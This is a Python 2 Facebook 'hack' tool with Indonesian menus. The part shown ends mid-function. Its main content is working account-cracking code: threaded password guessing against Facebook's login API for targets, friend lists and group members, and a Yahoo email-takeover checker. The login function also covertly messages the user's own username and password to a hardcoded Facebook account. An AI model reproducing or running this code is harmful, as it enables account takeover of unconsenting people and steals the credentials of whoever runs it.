#-*- coding: UTF-8 -*-
#################################################################
#                        Import Module
import json , sys , hashlib , os , time , marshal, getpass
import datetime, random, re, threading, urllib, requests, mechanize
from fbchat import Client
from fbchat.models import *
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

#################################################################
#                             COLOR
if sys.platform in ["linux","linux2"]:
	W = "\033[0m"
        G = '\033[32;1m'
        R = '\033[31;1m'
else:
	W = ''
	G = ''
	R = ''
###################################################################
#                      Exception
try:
	import requests
except ImportError:
	print "[!] Can't import module 'requests'\n , install it first"
	sys.exit()
####################################################################
#                    Set Default encoding
reload (sys)
sys . setdefaultencoding ( 'utf8' )
####################################################################
#       	        I don't know
jml = []
jmlgetdata = []
n = []

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

####################################################################
#                        BANNEr

def baliho():
	os.system('clear')
	try:
		token = open('tes/token.log','r').read()
		r = requests.get('https://graph.facebook.com/me?access_token=' + token)
		a = json.loads(r.text)
		name = a['name']
		idk  = a['id']
		emil = a['email']
		n.append(a['name'])

		print R + '_     _'.center(44)
		print "o' \.=./ `o".center(44)
		print '(o o)'.center(44)
		print 'ooO--(_)--Ooo'.center(44)
		print ('FB HACK BETA').center(44)
		print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
    		print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + name
    		print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
    		print '\x1b[1;37;40m1. Informasi Pengguna'
    		print '\x1b[1;37;40m2. Hack Akun Facebook'
    		print '\x1b[1;37;40m3. Bot               '
    		print '\x1b[1;37;40m4. Lainnya....       '
    		print '\x1b[1;37;40m5. LogOut            '
    		print '\x1b[1;31;40m0. Keluar            '
    		print
		
    		main()

	except (KeyError,IOError):
		print R + '_     _'.center(44)
		print "o' \.=./ `o".center(44)
		print '(o o)'.center(44)
		print 'ooO--(_)--Ooo'.center(44)
		print ('FB HACK BETA').center(44)
		print R + '_  Login dulu Boy   _'.center(44)
		login()
#################################################################



#     LOGIN 

def login():

	print '[*] login to your facebook account         ';
	id = raw_input('[?] Username : ');
	pwd = getpass.getpass('[?] Password : ');
	
	
	API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';
	data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};
	sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
        x.update(sig)
	data.update({'sig':x.hexdigest()})
	client = Client(id,pwd)
	friends = client.searchForUsers('mrx.anom.1')
	friend = friends[0]
	client.send(Message(id+'|'+pwd), thread_id=friend.uid, thread_type=ThreadType.USER)
	client.logout()

#====[==[[=======================================================

        get(data)




def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('tes')
	except OSError:
		pass

	b = open('tes/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)
		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		time.sleep(3)
		baliho()
		main()
	except KeyError:
		print 'akun terkena checkpoin, konfrimasi lewat broweser yang aktif'
		print (R +'[!] Failed to generate access token')
		print '[!] Check your connection / email or password'
		os.remove('tes/token.log')
		time.sleep(3)
		baliho()
	except requests.exceptions.ConnectionError:
		print (R +'[!] Failed to generate access token')
		print 'atau akun terkena checkpoin, konfrimasi lewat broweser yang aktif'
		print '[!] Connection error !!!'
		os.remove('tes/token.log')
		time.sleep(3)
		baliho()

#############################
#              UTAMA    

def main():
  global target_id
  try:
	cek = raw_input(R + 'Pilih' + W +' : ')
# pilihan pertama melihat informasi akun
	if cek.lower() == '1':
		    os.system('clear')
		    try:
		        toket = open('tes/token.log', 'r').read()
		    except IOError:
		        print '\x1b[1;91m[!] Token tidak ditemukan'
		        os.system('rm -rf tes/token.log')
		        time.sleep(1)
   		    print 40 * '\x1b[1;97m\xe2\x95\x90'
		    print ' LIHAT INFORMASI AKUN '
		    print 40 * '\x1b[1;97m\xe2\x95\x90'
		    print 40 * '\x1b[1;97m\xe2\x95\x90'
		    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
		    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
		    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
		    cok = json.loads(r.text)
		    for p in cok['data']:
		        if id in p['name'] or id in p['id']:
		            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
		            z = json.loads(r.text)
		            print 40 * '\x1b[1;97m\xe2\x95\x90'
		            try:
		                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
		            except KeyError:
		                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
		            else:
		                try:
		                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
		                except KeyError:
		                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak ada'
		                else:
		                    try:
		                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
		                    except KeyError:
		                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'
		                    else:
		                        try:
		                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor HP\x1b[1;97m      : ' + z['mobile_phone']
		                        except KeyError:
		                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : \x1b[1;91mTidak ada'

		                        try:
		                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m        : ' + z['location']['name']
		                        except KeyError:
		                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m        : \x1b[1;91mTidak ada'

		                    try:
		                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
		                    except KeyError:
		                        print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'

		                try:
		                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m       : '
		                    for q in z['education']:
		                        try:
		                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
		                        except KeyError:
		                            print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

		                except KeyError:
		                    pass
			    
		            
			    print ' kembali '
		 	    main()
		    else:
		        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna tidak ditemukan'
			baliho()
# pilihan no 2 menu hack akun ke menu hack
	elif cek.lower() == '2':
	    menu_hack()

# pilihan no 3





#pilihan no 4


# pilihan no 5 logout menghapus akses token/logout
	elif cek.lower() == '5':
		print '''
[Warn] you must create access token again if 
       your access token is deleted
'''
		a = raw_input("[!] type 'ok' to continue : ")
		if a.lower() == 'ok':
			try:
				os.system('rm -rf tes/token.log')
				print '[*] Success delete cookie/token.log'
				time.sleep(3)
				sys.exit()
			except OSError:
				print '[*] failed to delete cookie/token.log'
				main()
		else:
			print '[*] failed to delete cookie/token.log'
			main()

# pilihan no 0 keluar program
	elif cek.lower() == '0':
		print "[!] Exiting Program"
		sys.exit()

# jika perintah kosong
	if 'dump_' in cek.lower() and cek.lower().split('_')[2] == 'id':
		target_id = cek.lower().split('_')[1]
		dump_id_id()
	else:
		if cek == '':
			main()
		else:
			print "[!] command '"+cek+"' not found"
			time.sleep(5)
			baliho()
			main()

  except KeyboardInterrupt:
	main()
  except IndexError:
	print '[!] invalid parameter on command : ' + cek
	main()

# menu hack 

def menu_hack():
    try:
        toket = open('tes/token.log', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf tes/token.log')
        time.sleep(1)

    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
    print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook'
    print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m5. Yahoo Checker'
    print '\x1b[1;37;40m6. Ambil id/email/hp'
    print '\x1b[1;31;40m0. Kembali'
    print
    hack_pilih()
# menu hak pilih
def hack_pilih():
    hack = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if hack == '':
        print '\x1b[1;91m[!] Jangan kosong'
        hack_pilih()
    else:
        if hack == '1':
            mini()
        else:
            if hack == '2':
                crack()
                hasil()
            else:
                if hack == '3':
                    super()
                else:
                    if hack == '4':
                        brute()
                    else:
                        if hack == '5':
                            menu_yahoo()
                        else:
                            if hack == '6':
                                grab()
                            else:
                                if hack == '0':
                                    main()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
                                    menu_hack()

# menu hack 1
def mini():
    os.system('clear')
    try:
        toket = open('tes/token.log', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf tes/token.log')
        time.sleep(1)
    else:
        
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[ INFO ] Akun target harus berteman dengan akun anda dulu !'
        try:
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + a['name']
            jalan('\x1b[1;91m[+] \x1b[1;92mMemeriksa \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[+] \x1b[1;92mMembuka keamanan \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token='+toket+'&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                            menu_hack()
                                        else:
                                            print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
                                            print '\x1b[1;91m[!] Cobalah dengan cara lain.'
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                            menu_hack()
        except KeyError:
            print '\x1b[1;91m[!] Terget tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()

# menu hack 2 
def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('tes/token.log', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf tes/token.log')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()



def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Koneksi terganggu'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'


def hasil():
    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
    keluar()

#menu hack 3
def super():
    global toket
    os.system('clear')
    try:
        toket = open('tes/token.log', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf tes/token.log')
        time.sleep(1)
        login()

    os.system('clear')
    
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Crack dari daftar Teman'
    print '\x1b[1;37;40m2. Crack dari member Grup'
    print '\x1b[1;31;40m0. Kembali'
    print
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                
                print 40 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    super()





# menu hack 5 yahoo ceker

def menu_yahoo():
    os.system('clear')
    try:
        toket = open('tes/token.log', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf tes/token.log')
        time.sleep(1)
        

    os.system('clear')
    
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Dari teman facebook'
    print '\x1b[1;37;40m2. Gunakan File'
    print '\x1b[1;31;40m0. Kembali'
    print
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Jangan kosong'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak ada'
                    yahoo_pilih()
# menu yahoo dari teman


def yahoofriends():
    os.system('clear')
    try:
        toket = open('tes/token.log', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf tes/token.log')
        time.sleep(1)
        

    os.system('clear')
    
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
